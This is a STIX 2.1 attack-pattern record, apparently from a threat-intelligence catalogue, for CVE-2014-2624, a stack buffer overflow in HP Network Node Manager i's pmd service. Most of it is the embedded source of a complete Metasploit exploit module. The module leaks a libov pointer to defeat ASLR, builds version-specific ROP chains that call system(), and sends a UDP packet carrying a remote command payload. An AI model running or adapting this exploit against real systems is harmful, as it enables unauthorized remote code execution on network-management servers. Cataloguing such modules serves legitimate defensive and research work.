{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--51cd585b-350b-45e1-ba58-ff9689630482",
    "created": "2024-08-14T16:57:16.621317Z",
    "modified": "2024-08-14T16:57:16.621321Z",
    "name": "HP Network Node Manager I PMD Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in HP Network Node Manager I (NNMi). The vulnerability exists in the pmd service, due to the insecure usage of functions like strcpy and strcat while handling stack_option packets with user controlled data. In order to bypass ASLR this module uses a proto_tbl packet to leak an libov pointer from the stack and finally build the ROP chain to avoid NX. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/misc/hp_nnmi_pmd_bof.rb",
            "external_id": "hp_nnmi_pmd_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-2624"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::Udp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'HP Network Node Manager I PMD Buffer Overflow',\n      'Description'    => %q{\n        This module exploits a stack buffer overflow in HP Network Node Manager I (NNMi). The\n        vulnerability exists in the pmd service, due to the insecure usage of functions like\n        strcpy and strcat while handling stack_option packets with user controlled data. In\n        order to bypass ASLR this module uses a proto_tbl packet to leak an libov pointer from\n        the stack and finally build the ROP chain to avoid NX.\n      },\n      'Author'         =>\n        [\n          'd(-_-)b',     # Vulnerability discovery\n          'juan vazquez' # Metasploit module\n        ],\n      'References'     =>\n        [\n          ['CVE', '2014-2624'],\n          ['ZDI', '14-305']\n        ],\n      'Payload'        =>\n        {\n          'BadChars'    => \"\\x00\",\n          'Space'       => 3000,\n          'DisableNops' => true,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd cmd_bash',\n              'RequiredCmd' => 'generic python perl openssl bash-tcp gawk'\n            }\n        },\n      'Arch'           => ARCH_CMD,\n      'Platform'       => 'unix',\n      'Targets'        =>\n        [\n          ['Automatic', {}],\n          ['HP NNMi 9.10 / CentOS 5',\n            {\n              # ptr to .rodata with format specifier\n              #.rodata:0003BE86 aS_1            db '%s',0\n              'ov_offset'      => 0x3BE86,\n              :rop             => :rop_hp_nnmi_9_10\n            }\n          ],\n          ['HP NNMi 9.20 / CentOS 6',\n            {\n              # ptr to .rodata with format specifier\n              #.rodata:0003C2D6 aS_1            db '%s',0\n              'ov_offset'      => 0x3c2d8,\n              :rop             => :rop_hp_nnmi_9_20\n            }\n          ]\n        ],\n      'Privileged'     => false, # true for HP NNMi 9.10, false for HP NNMi 9.20\n      'DisclosureDate' => '2014-09-09',\n      'DefaultTarget'  => 0\n      ))\n\n    register_options([ Opt::RPORT(7426) ])\n  end\n\n  def check\n    header = [\n      0x2a5,  # pmdmgr_init pkt\n      0x3cc,  # signature\n      0xa0c,  # signature\n      0xca8   # signature\n    ].pack(\"V\")\n\n    data = \"\\x00\" * (0xfa4 - header.length)\n\n    pkt = header + data\n\n    connect_udp\n    udp_sock.put(pkt)\n    res = udp_sock.timed_read(8, 1)\n    if res.blank?\n      # To mitigate MacOSX udp sockets behavior\n      udp_sock.put(pkt)\n      res = udp_sock.timed_read(8)\n    end\n    disconnect_udp\n\n    if res.blank?\n      return Exploit::CheckCode::Unknown\n    elsif res.length == 8 && res.unpack(\"V\").first == 0x2a5\n      return Exploit::CheckCode::Detected\n    else\n      return Exploit::CheckCode::Unknown\n    end\n  end\n\n  def exploit\n    connect_udp\n    # info leak with a \"proto_tbl\" packet\n    print_status(\"Sending a 'proto_tbl' request...\")\n    udp_sock.put(proto_tbl_pkt)\n\n    res = udp_sock.timed_read(13964, 1)\n    if res.blank?\n      # To mitigate MacOSX udp sockets behavior\n      udp_sock.put(proto_tbl_pkt)\n      res = udp_sock.timed_read(13964)\n    end\n\n    if res.blank?\n      fail_with(Failure::Unknown, \"Unable to get a 'proto_tbl' response...\")\n    end\n\n    if target.name == 'Automatic'\n      print_status(\"Fingerprinting target...\")\n      my_target = auto_target(res)\n      fail_with(Failure::NoTarget, \"Unable to autodetect target...\") if my_target.nil?\n    else\n      my_target = target\n      fail_with(Failure::Unknown, \"Unable to leak libov base address...\") unless find_ov_base(my_target, res)\n    end\n\n    print_good(\"Exploiting #{my_target.name} with libov base address at 0x#{@ov_base.to_s(16)}...\")\n\n    # exploit with a \"stack_option_pkt\" packet\n    udp_sock.put(stack_option_pkt(my_target, @ov_base))\n\n    disconnect_udp\n  end\n\n  def rop_hp_nnmi_9_10(ov_base)\n    rop = rand_text_alpha(775)\n    rop << [0x808d7c1].pack(\"V\")          # pop ebx ; pop ebp ; ret\n    rop << [ov_base + 0x481A8].pack(\"V\")  # ebx: libov .got\n    rop << [0x8096540].pack(\"V\")          # ptr to .data where user controlled string will be stored:\n                                          # \"PMD Stack option specified, but stack not available (user_controlled)\"\n    rop << [0x808d7c2].pack(\"V\")          # pop ebp # ret\n    rop << [0x08096540 + 4732].pack(\"V\")  # ebp: ptr to our controlled data in .data (+0x1028 to compensate)\n    rop << [ov_base +  0x1D692].pack(\"V\") # ptr to 'call _system' sequence:\n                                          #.text:0001D692  lea     eax, [ebp+dest]\n                                          #.text:0001D698  push    eax             ; command\n                                          #.text:0001D699  call    _system\n    rop\n  end\n\n  def rop_hp_nnmi_9_20(ov_base)\n    rop = rand_text_alpha(775)\n    rop << [0x808dd70].pack(\"V\")                      # pop eax ; pop ebx ; pop ebp ; ret\n    rop << [0xf7f61cd0 + ov_base + 0x1dae6].pack(\"V\") # eax: ptr to 'call _system' sequence\n                                                      #.text:0001DAE6  lea     eax, [ebp+dest] (dest = -0x1028)\n                                                      #.text:0001DAEC  push    eax             ; command\n                                                      #.text:0001DAED  call    _system\n    rop << [0x08097160].pack(\"V\")                     # ebx: ptr to .data where user controlled string will be stored:\n                                                      # \"PMD Stack option specified, but stack not available (user_controlled)\"\n    rop << rand_text_alpha(4)                         # ebp: padding\n    rop << [0x804fb86].pack(\"V\")                      # add eax 0x809e330 ; add ecx ecx ; ret (control eax)\n    rop << [0x8049ac4].pack(\"V\")                      # xchg eax, edi ; ret\n    rop << [0x808dd70].pack(\"V\")                      # pop eax ; pop ebx ; pop ebp ; ret\n    rop << [0xf7f61cd0 + ov_base + 0x47f1c].pack(\"V\") # eax: libov .got base\n    rop << rand_text_alpha(4)                         # ebx: padding\n    rop << [0x8097160 + 4764].pack(\"V\")               # ebp: ptr to our controlled data in .data (+0x1028 to compensate)\n    rop << [0x804fb86].pack(\"V\")                      # add eax 0x809e330 ; add ecx ecx ; ret (control eax)\n    rop << [0x805a58d].pack(\"V\")                      # xchg ebx eax ; and eax 0xc4830001 ; and cl cl ; ret (ebx: libov .got)\n    rop << [0x8049ac4].pack(\"V\")                      # xchg eax, edi ; ret ; (eax: call to system sequence from libov)\n    rop << [0x80528BC].pack(\"V\")                      # jmp eax\n\n    rop\n  end\n\n  def stack_option_pkt(t, ov_base)\n    hdr = [0x2a9].pack(\"V\")             # stack_option packet\n    data = \"-SA\"                        # stack name (invalid one 'A')\n    data << \";\"                         # separator\n    data << self.send(t[:rop], ov_base) # malformed stack options\n    data << payload.encoded\n    data << \";\\n\"\n    data << \"\\x00\" * (0xfa4 - data.length - hdr.length)\n\n    hdr + data\n  end\n\n  def proto_tbl_pkt\n    hdr = [0x2aa].pack(\"V\") # proto_tbl packet\n    data = \"\\x00\" * (0xfa4 - hdr.length)\n\n    hdr + data\n  end\n\n  def base(address, offset)\n    address - offset\n  end\n\n  def find_ov_base(t, data)\n    print_status(\"Searching #{t.name} pointers...\")\n    i = 0\n    data.unpack(\"V*\").each do |int|\n      if base(int, t['ov_offset']) % 0x1000 == 0\n        print_status(\"Pointer 0x#{int.to_s(16)} found at offset #{i * 4}\")\n        @ov_base = base(int, t['ov_offset'])\n        return true\n      end\n      i = i + 1\n    end\n\n    false\n  end\n\n  def auto_target(data)\n    targets.each do |t|\n      next if t.name == 'Automatic'\n      if find_ov_base(t, data)\n        return t\n      end\n    end\n\n    nil\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-09-09",
    "x_mitre_platforms": [
        "unix'"
    ]
}